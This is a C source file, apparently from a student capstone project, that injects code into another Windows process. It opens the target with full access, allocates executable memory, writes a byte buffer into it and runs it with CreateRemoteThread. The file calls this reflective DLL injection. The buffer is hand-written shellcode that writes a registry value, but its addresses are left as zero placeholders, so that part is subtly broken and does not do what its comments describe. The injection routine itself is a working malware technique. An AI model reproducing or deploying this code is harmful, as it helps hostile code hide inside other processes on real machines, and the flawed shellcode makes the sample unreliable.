#include <windows.h>
#include <stdio.h>

// Function to perform reflective DLL injection
BOOL ReflectiveDLLInjection(DWORD dwProcessId, BYTE* pDllBuffer, DWORD dwDllSize)
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (hProcess == NULL)
    {
        printf("Failed to open the target process.\n");
        return FALSE;
    }

    // Allocate memory in the target process for the DLL
    LPVOID pRemoteDll = VirtualAllocEx(hProcess, NULL, dwDllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteDll == NULL)
    {
        printf("Failed to allocate memory in the target process.\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    // Write the DLL content to the allocated memory in the target process
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pRemoteDll, pDllBuffer, dwDllSize, &bytesWritten) || bytesWritten != dwDllSize)
    {
        printf("Failed to write the DLL to the target process memory.\n");
        VirtualFreeEx(hProcess, pRemoteDll, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Create a remote thread in the target process to execute the DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteDll, NULL, 0, NULL);
    if (hThread == NULL)
    {
        printf("Failed to create a remote thread in the target process.\n");
        VirtualFreeEx(hProcess, pRemoteDll, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Get the exit code of the remote thread
    DWORD exitCode;
    GetExitCodeThread(hThread, &exitCode);

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteDll, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return exitCode != 0;
}

int main()
{
    // Construct the DLL content (including the code and data)
    BYTE pDllBuffer[] = {
        0x55,                                     // push ebp
        0x8B, 0xEC,                               // mov ebp, esp
        0x68, 0x00, 0x00, 0x00, 0x00,             // push offset szKeyPath
        0x68, 0x00, 0x00, 0x00, 0x00,             // push offset szValueName
        0x68, 0x00, 0x00, 0x00, 0x00,             // push offset szValueData
        0xFF, 0x15, 0x00, 0x00, 0x00, 0x00,       // call RegSetValueExA
        0xC9,                                     // leave
        0xC3,                                     // ret
        'H','K','C','U','\\',
        'S', 'O', 'F', 'T', 'W', 'A', 'R', 'E',   // szKeyPath: "HKCU\\SOFTWARE\\CAPSTONE\\Example"
        '\\', 'C','A','P','S','T','O','N','E','\\',
        'E', 'x', 'a', 'm', 'p', 'l', 'e', 0x00,
        'V', 'a', 'l', 'u', 'e', 'N', 'a', 'm', 'e',  // szValueName: "TestValue"
        0x00,
        'T', 'e', 's', 't', 'D', 'a', 't', 'a',       // szValueData: "Test Data"
        0x00
    };

    // Replace with the path to your compiled DLL file
    LPCWSTR pszDllPath = L"D:/Drive/APranav/Capstone/Phase2/ReflectiveDLL/mydll.dll";

    // Load the DLL
    HMODULE hDll = LoadLibraryW(pszDllPath);
    if (hDll == NULL)
    {
        printf("Failed to load the DLL.\n");
        return 1;
    }

    // Replace with the target process ID where you want to inject the DLL
    DWORD dwTargetProcessId = 21000;

    if (!ReflectiveDLLInjection(dwTargetProcessId, pDllBuffer, sizeof(pDllBuffer)))
    {
        printf("Failed to perform reflective DLL injection.\n");
        return 1;
    }

    printf("Reflective DLL injection succeeded.\n");

    // Get the address of the DllMain function
    //FARPROC pDllMain = GetProcAddress(hDll, "main");
    //if (pDllMain == NULL)
    //{
    //    printf("Failed to get the address of DllMain.\n");
    //    FreeLibrary(hDll);
    //    return 1;
    //}    

    return 0;
}

